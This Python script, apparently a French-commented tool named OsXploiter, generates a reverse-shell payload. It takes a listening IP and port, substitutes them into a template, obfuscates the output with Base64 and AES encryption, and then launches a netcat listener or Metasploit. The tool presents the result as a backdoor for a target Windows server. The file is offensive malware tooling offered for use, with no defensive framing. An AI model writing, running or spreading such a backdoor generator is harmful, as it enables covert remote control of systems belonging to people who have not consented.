import subprocess
import os
from colorama import Fore, Style
import random
import AES
import B64


# Installer colorama avec: pip install colorama

def read_file_content(file_path):
    with open(file_path, 'r') as file:
        return file.read()

def write_to_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

def generate_random_key():
    return str(random.randint(1, 50000))

def replace_and_write_template(template_content, ip, port, nak):
    replaced_content = template_content.replace("@@@@", ip).replace("####", port)
    while "@@@@" in replaced_content or "####" in replaced_content:
        replaced_content = replaced_content.replace("@@@@", ip).replace("####", port)

    file_path = f"{nak}.py"
    write_to_file(file_path, replaced_content)
    return file_path

def print_colored(message, color=Fore.WHITE):
    print(f"{color}{message}{Style.RESET_ALL}")

def main():
    # Vérifier si le script est exécuté en tant que superutilisateur (root)
   
    notice = """
      ####################################################
      #   ____      __   __      _       _ _             #
      #  / __ \     \ \ / /     | |     (_) |            #
      #  | |  | |___ \ V / _ __ | | ___  _| |_ ___ _ __  #
      #  | |  | / __| > < | '_ \| |/ _ \| | __/ _ \ '__| #
      #  | |__| \__ \/ . \| |_) | | (_) | | ||  __/ |    #
      #  \____/|___/_/ \_\ .__/|_|\___/|_|\__\___|_|     #
      #                  | |                             #
      #                  |_|                             #
      #     V.0.1 : CODED BY AIT-EL MOUDDENE OsmX        #     
      #                                                  #
      ####################################################
    """
    print(notice)

    ip = input("Your LHOST\listening IP [Necessary]: ")
    port = input("Your PORT\Listening PORT [Necessary]: ")
    nak = input("!Your Payload name!: ")
    key = input("!Integer! Key for encryption [Optional]: ")

    # Check if ip and port are empty
    if not ip or not port:
        raise ValueError(Fore.RED + "Can't be empty! Please provide a valid IP and port." + Style.RESET_ALL)

    # If key is not provided, generate a random number between 1 and 50000
    if not key:
        key = generate_random_key()

    template_content = read_file_content("template.py")
    generated_file_path = replace_and_write_template(template_content, ip, port, nak)

    try:
        print_colored("\n(+) B64 Encryption & Obfuscation Process ...", Fore.GREEN)
        test2 = B64.Encode()
        test2.encode(generated_file_path)
        print_colored("(++)Completed Successfully!\n", Fore.GREEN)

        print_colored("(+++) AES Encryption Process ...", Fore.GREEN)
        test1 = AES.Encryptor(key, generated_file_path)
        test1.gen()
        print_colored("(++++) Completed Successfully!", Fore.GREEN)
        print_colored("(+++++) Payload generated at : /"+nak+".py , "+"Opening netcat....", Fore.CYAN)
        print("""
            [+] Now you have a Reverse shell payload, you can use it as Backdoor for your Windows Server target [+]
            [+] Shuuuu.... its time to listening now....! How do you like to listen [+]
            1) Netcat 
            2) Metasploit Reverse shell TCP 
            3) Others (Exit OsXploiter)                             
 



         """)
        x = input(" 1/2/3 => ")
        if x =="1":
            os.system("sudo nc -lnvp"+port)
        if x =="2":
            os.system("sudo msfconsole")
        
            


    except Exception as e:
        print_colored(f"Error: {e}", Fore.RED)

if __name__ == '__main__':
    main()
